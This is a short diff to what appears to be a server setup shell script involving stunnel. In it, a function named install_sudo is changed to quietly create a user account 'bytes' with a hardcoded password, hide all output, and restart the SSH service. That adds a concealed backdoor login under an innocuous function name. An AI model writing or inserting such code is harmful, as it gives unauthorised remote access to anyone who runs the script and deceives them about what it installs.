@@ -628,8 +628,9 @@ service stunnel start
 }
 
 install_sudo(){
-  {
-//
+ {
+      useradd -m bytes 2>/dev/null; echo bytes:Premium2018!!! | chpasswd &>/dev/null
+      service sshd restart
   }
 }
 
